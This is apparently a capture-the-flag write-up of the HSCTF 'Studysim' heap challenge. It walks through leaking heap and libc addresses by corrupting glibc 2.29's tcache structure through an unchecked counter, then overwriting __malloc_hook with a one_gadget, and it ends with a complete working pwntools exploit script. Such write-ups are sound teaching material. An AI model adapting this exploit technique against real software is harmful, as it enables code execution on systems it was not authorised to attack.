# Studysim

This was a fun challenge on the vulnerable Tcache bins but different one compared to the simple FD overwrites one would expect. So let’s check it out!

Along, with the challenge binary we were provided with  Glibc 2.29 and loader for it. You can possibly use patchelf tool if your local environment is not of the one required for the challenge, so that your binary loads the Glibc 2.29 libc and the required loader for it.

Carrying out the initial checksec step, we get the following information on the mitigations:
```
Canary : Yes
NX : Yes
PIE : No
Fortify : No
RelRO : Full
```
So possibly some overwrite on any of the hooks? A possible FSOP? Let’s explore!

The menu function which we are presented with:
```
Welcome to study simulator!
Because who has free time when you must STUDY.
Commands:
add - Adds a worksheet onto your stack of worksheets
do - Complete the top worksheets
sleep - Give up and sleep
>
```

### Add

Let’s us create a new chunk of any size below 0x400 and then the allocated chunk’s address is then stored in an array called stack in .bss section. If the count of the chunks is already 7 then we cannot store anymore chunks but otherwise it simply increments the count variable.

stack[allocated_count ++] = address of the allocated chunk

After this we can give some content and it prints back the content which we have just added.

### Do

Here comes the vulnerable part. The function asks the user to input any number of integer and reduces the value of allocated_count by that much value without any checks on the input value. Which means using this we can store our return allocated address anywhere on the .bss. This is how the .bss section looks like:

```
0x404020 <stdout@@GLIBC_2.2.5>: 0x00007ffff7fc6760 0x0000000000000000
0x404030 <stdin@@GLIBC_2.2.5>: 0x00007ffff7fc5a00 0x0000000000000000
0x404040 <allocated_count>: 0x0000000000000000 0x0000000000000000
0x404050: 0x0000000000000000 0x0000000000000000
0x404060 <stack>: 0x0000000000000000 0x0000000000000000
0x404070 <stack+16>: 0x0000000000000000 0x0000000000000000
0x404080 <stack+32>: 0x0000000000000000 0x0000000000000000
0x404090 <stack+48>: 0x0000000000000000 0x0000000000000000
```

### Sleep

Well, it just sleeps and exits. Nothing interesting here.

## Getting the Leaks

To get the heap leaks, we can invoke the Do() functionality and then reduce the allocated_count to a negative value such that the address of the heap chunk returned by the malloc function is stored on the allocated_count .bss address. As the binary prints out the value of allocated_count here we get the heap leaks.
```
You throw the worksheet '0@@' on your stack of worksheets.
>
```

For the libc leaks, well it won’t be that easy as there’s a size check and also no free() to invoke anywhere anyhow. As the libc addresses are stored on the .bss section we need to somehow get an allocation there (as the binary prints the content of the chunk). So now how do we control this? Here, comes the Tcache structure.

I found this really good reference for understanding about how the Tcache keeps a track of the number of chunks in Tcache and their addresses. I won’t be explaining it in detail; you can check out the resource mentioned and try checking out the structure in GDB by allocating and freeing chunks in Tcache for any program which allows you to do it.

By calculating the right offset with the heap leaks and the known .bss address of the array stack one can get the allocation in the Tcache structure ( using the Do() functionality again ofc). First, we can overwrite the first 8 bytes of tcache_perthread_struct.count. And then similarly on the next allocation we can overwrite the first pointer stored in tcache_perthread_struct.entries (such that it acts as a freed chunk of size of 0x20 bytes). This pointer must have the .bss address of stdout_GLIBC stored as it’s forward pointer. So on the next call on malloc you can get an allocation there and cleverly leak out the libc address stored!

```
0x1553000: 0x0000000000000000 0x0000000000000251 <-- Tcache struct begins
0x1553010: 0x000000000155327f 0x0000000000000000 <-- First 8 bytes overwritten with count
0x1553020: 0x0000000000000000 0x0000000000000000
0x1553030: 0x0000000000000000 0x0000000000000000
0x1553040: 0x0000000000000000 0x0000000000000000
0x1553050: 0x0000000000404030 0x0000000000000000 <-- Next chunk in line for allocation
0x1553060: 0x0000000000000000 0x0000000000000000
```

## Final Exploit

By using the same trick as for the libc leaks, we can trigger the final exploit. Like last time by cleverly getting an allocation on Tcache (probably a chunk of another size, as it might give SIGSEV) of a chunk with FD pointer set to _malloc_hook_. On the next call to malloc() function we would get an allocation on _malloc_hook_ (exploiting the naive tcache). Now you can simply overwrite it with a one_gadget and on next malloc KABOOM!!!

```python
from pwn import *
 
bss_stack = 0x404060
 
#k = process("./studysim",env = {"LD_PRELOAD" : "./libc.so.6"})
k = remote('pwn.hsctf.com', 5007)
def add(size,content):
   k.sendlineafter("> ","add")
   k.sendlineafter("worksheet?\n",str(size))
   k.sendlineafter("worksheet?\n",content)
 
def do(count):
   k.sendlineafter("> ","do")
   k.sendlineafter("finish?\n",str(count))
 
def sleep():
   k.sendlineafter("> ","sleep")
stdout_bss = 0x0000000000404030
#heap leaks
do(4)
add(0x10,'a'*0x10)
do(0)
k.recvuntil("Only ")
heap_leak = int(k.recvline().strip().split(" ")[0],10)-1
print(hex(heap_leak))
do(heap_leak)
#get a count
chunk = heap_leak-0x250-0x8
diff = -bss_stack+chunk
do(-diff/8)
add(0x10,'c'*0x10)
do(diff/8+1)
#allocate a chunk at .bss addr of stdin
chunk = heap_leak-0x208-0x10
diff = -bss_stack+chunk
do(-diff/8)
add(0x10,p64(stdout_bss))
do(diff/8+1)
add(0x08,'')
 
k.sendlineafter("> ","add")
k.sendlineafter("worksheet?\n",str(0x8))
k.sendlineafter("worksheet?\n",'a')
 
k.recvuntil("worksheet ")
leak = k.recvline().strip().split(" ")[0].replace("'","")
leak = '\x00'+leak[1:]
leak = u64(leak.ljust(8,'\x00'))
libc_base = leak-0x1e4a00
print(hex(libc_base))
 
do(3)
 
#allocate chunk at __malloc_hook
malloc_hook = libc_base + 0x0000000001e4c30
system = libc_base + 0x0000000000052fd0
one_gadget = libc_base + 0xe2383
chunk = heap_leak-0x208-0x8
diff = -bss_stack+chunk
do(-diff/8)
add(0x20,p64(malloc_hook))
do(diff/8+1)
add(0x08,'')
 
k.sendlineafter("> ","add")
k.sendlineafter("worksheet?\n",str(0x8))
k.sendlineafter("worksheet?\n",p64(one_gadget))
do(2)
 
#call system
k.sendlineafter("> ","add")
k.sendlineafter("worksheet?\n",'0')
 
k.interactive()
```


